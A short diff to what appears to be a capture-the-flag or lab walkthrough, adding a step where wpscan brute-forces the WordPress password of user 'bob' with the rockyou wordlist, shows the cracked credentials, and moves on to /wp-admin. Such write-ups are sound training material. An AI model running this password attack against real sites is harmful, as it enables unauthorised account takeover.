@@ -143,5 +143,19 @@ Finished
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
 ```
++ Now we continue using WpScan to brute force user to find available passwords.
+
+```bash
+    wpscan --url <IP>/wordpress -U bob -P rockyou.txt
++] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - bob / soccer                                                                   
+Trying bob / angel Time: 00:00:01 <                 > (36 / 14344428)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: bob, Password: soccer
+```
+---> We've found the password and use it to login again /wp-admin.
+
+
 
 
